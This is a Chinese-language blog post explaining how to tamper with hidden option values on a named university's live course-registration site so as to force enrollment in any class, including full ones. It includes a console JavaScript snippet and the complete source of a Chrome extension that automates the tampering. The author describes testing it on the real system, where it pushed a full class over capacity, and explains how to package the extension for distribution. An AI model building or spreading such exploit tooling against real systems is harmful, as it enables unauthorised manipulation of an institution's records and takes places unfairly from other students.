title: 破解選課系統，打造瘋狂Chrome擴充套件
date: 2015-02-26 17:35:31
categories:
  - Development
---

交大的選課系統真的是隨機、按照志願序來分發嗎？其實仔細觀察便可知，此系統是遵循一套編碼規則，如果將此編碼加以利用，就能達到百分之百命中第一志願的效果，本文除了解析漏洞，也會利用此漏洞寫成一個簡便的Chrome擴充

<!--more-->

## 探索漏洞

登入[選課系統](https://cos.adm.nctu.edu.tw/index.asp)，進入加選功能，再任意選擇一個課程篩選分類，例如我選擇`大一通識`，接著在填寫志願序的下拉選單按`滑鼠右鍵`>`檢查元素`，會跳出Chrome的開發者工具，方便我們檢視Dom Tree。展開我們想檢視的`select`元素，觀察`option`子元素的`value`屬性，這是實際上會送進伺服器處理的資料

![](檢查元素1.png)

四個選項的功能和value對應如下表

| 功能 | option的value屬性 |
| --- | --- |
| 取消登記 | 7006101 |
| 第１志願 | 7106101 |
| 第２志願 | 7206101 |
| 第３志願 | 7306101 |

各位看出什麼了嗎？value的前三碼就是功能碼，後四碼則是當期課號，繼續觀察各種選項後，得到功能碼共有下列數種

| 功能 | 功能碼 |
| --- | --- |
| 取消登記 | 100、200、... |
| 第１志願 | 110、210、... |
| 第２志願 | 120、220、... |
| 第３志願 | 130、230、... |
| 第４志願 | 140、240、... |
| 第５志願 | 150、250、... |
| 退選 | X0F |
| 已選 | XFF |
| 未登記 | 000 |
| 登記 | 010 |
| 未選 | X00 |
| 加選 | XF0 |

分析功能碼最高位（最左邊）可以細分為`1: 外語`、`3: 軍訓`、`5: 各學院共同必修課程`、`7: 通識`、`8: 物理`、`A: 服務學習`、`B: 藝文賞析`、...等等（有些課我已經無法選了，所以查不到代碼），這一碼是分類碼；中間這碼代表的則是`欲操作的功能`；最低位的第三碼是當前選擇這門課的狀態

最讓人眼睛為之一亮的功能碼就是`F`的加選功能，已知課號和功能碼，只要將value值左邊數來第2碼改為`F`再送至伺服器，理論上就能強迫選上任何想選的課，知道原理後就可以開工寫code啦

## 撰寫Code Snippet

選課系統有jQuery可以使用，因此簡化了dom的操作。選課系統整體是用多個frame拼湊起來的，所以第1行先取得目標frame的dom tree；2~6行則是我們的主要操作，遍歷每個下拉選單，在每個選單中新增一個`強迫選課`的選項，並將value值左邊數來第2碼改為`F`

```js
var docTree = $('frame[name=DOWN]', $('frame[name=frmMain]', top.document)[0].contentDocument)[0].contentDocument;
$('select[name=Choice]', docTree).each(function(index) {
  var p = $(this).find('option:first').attr('value').substring(0, 1);
  var q = $(this).find('option:first').attr('value').substring(2);
  $(this).append('<option value="' + p + 'F' + q + '">強迫選課</option>');
});
```

將此code貼在開發者工具的console，在想要強迫選中的課程，選擇`強迫選課`>`確認`，回到`查詢選課狀況`就會看到剛剛選擇的課程已經選上囉！

## 打造Chrome Extension

前面只是原理解析，透過撰寫擴充，我們可以讓這件事情更自動化

### 目錄結構

- manifest.json是擴充的定義檔案
- Icon是在國外網站挑選的[Tick box with check mark](http://www.freepik.com/free-icon/tick-box-with-check-mark_741076.htm)
- popup.html是在Chrome單擊擴充圖案時跳出來的主畫面
- popup.js用來控制popup.html的邏輯
- content.js和jquery是要注入選課系統的scripts

```
專案資料夾/
- manifest.json
- icon16.png
- icon32.png
- icon128.png
- jquery-1.11.2.min.js
- popup.html
- popup.js
- content.js
```

下面是各檔案的原始碼

#### manifest.json

```json
{
  "manifest_version": 2,
  "name": "智慧型交大選課系統",
  "version": "1.0",
  
  "description": "強化選課系統，100%選上想修的課",
  "icons": {
    "16": "icon16.png",
    "32": "icon32.png",
    "128": "icon128.png"
  },

  "browser_action": {
    "default_icon": "icon32.png",
    "default_popup": "popup.html"
  },

  "author": "Go Creating",
  "content_scripts": [ {
    "matches": ["https://cos.adm.nctu.edu.tw/*"],
    "js": ["jquery-1.11.2.min.js", "content.js"]
  }],
  "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",

  "permissions": [
    "activeTab"
  ]
}
```

#### popup.html

```html
<!doctype html>
<html>
  <head>
    <meta charset="utf8">
    <title>super選課</title>
    <script src="jquery-1.11.2.min.js"></script>
    <script src="popup.js"></script>
    <style type="text/css">
      body {
        min-width: 100px;
      }
    </style>
  </head>
  <body>
    <button id="setup">啟用強迫選課功能</button>
  </body>
</html>
```

#### popup.js

```js
$(function(){
  $('#setup').click(function(){
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      // fire an enabling message
      chrome.tabs.sendMessage(tabs[0].id, {
        msg: 'init'
      }, function(response) {
        if (response.status == 1) {
          $('#setup').attr('disabled', true);;
          $('#setup').text('已啟用')
        } else if (response.status == 0) {
          alert('失敗');
        }
      });
    });
  });
});
```

#### content.js

```js
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.msg == 'init') {
    var msg = 'success';
    var isError = false;

    var docTree = $('frame[name=DOWN]', $('frame[name=frmMain]', top.document)[0].contentDocument)[0].contentDocument;
    if (docTree) {
      $('select[name=Choice]', docTree).each(function(index) {
        var p = $(this).find('option:first').attr('value').substring(0, 1);
        var q = $(this).find('option:first').attr('value').substring(2);
        $(this).append('<option style="background-color:red;color:white;" value="' + p + 'F' + q + '">強迫選課</option>');
      });
    } else {
      isError = true;
      msg = exception;
    }

    // response message
    sendResponse({
      status: (isError? 0: 1),
      msg: msg
    });
  }
});
```

### 使用擴充

進入Chrome的[擴充功能頁](chrome://extensions)，勾選`開發人員模式`，單擊`載入未封裝擴充功能`，選擇整個專案的資料夾

![](載入.png)

回到選課系統，在加選頁面中`單擊擴充圖示`>`啟用強迫選課功能`

![](啟用.png)

啟用成功後，按鈕會被Disable，選課功能會多出一個`強迫選課`的選項，選下去就會Bingo了！

![](強迫選課.png)

### 測試

隨手挑了一個沒有衝堂的通識課，選擇`強迫選課`>`確認`

![](測試.png)

在選課狀況的頁面可以看到此門通識已經直接被我選上了

![](測試結果.png)

選上的當下，人數不會立即變動，server應該是有個排程每隔約15分鐘會刷新一次，稍候一段時間，修課人數在滿班的情況下增加1人了

![](人數變動.png)

### 封裝

在擴充功能頁單擊`封裝擴充功能`>選擇專案目錄>`封裝擴充功能`

![](封裝.png)

封裝完成後，會在專案目錄的上層目錄產生`.crx`封裝檔和`.pem`金鑰檔

![](封裝成功.png)

`.crx`封裝檔是用來發佈的檔案，打開`擴充功能頁`，將檔案拖曳進來就可以安裝了
`.pem`是如果擴充有上架的話，必須透過此金鑰來更新或進行其他操作

### 上架

上架必須到[Chrome Developer Dashboard](https://chrome.google.com/webstore/developer/dashboard?hl=zh-TW)，可是要5鎂，還是算了吧！

## 結論

原來以前新聞報說破解選課系統都是真的...

## 參考資料

- [官方Extension開發教學](https://developer.chrome.com/extensions)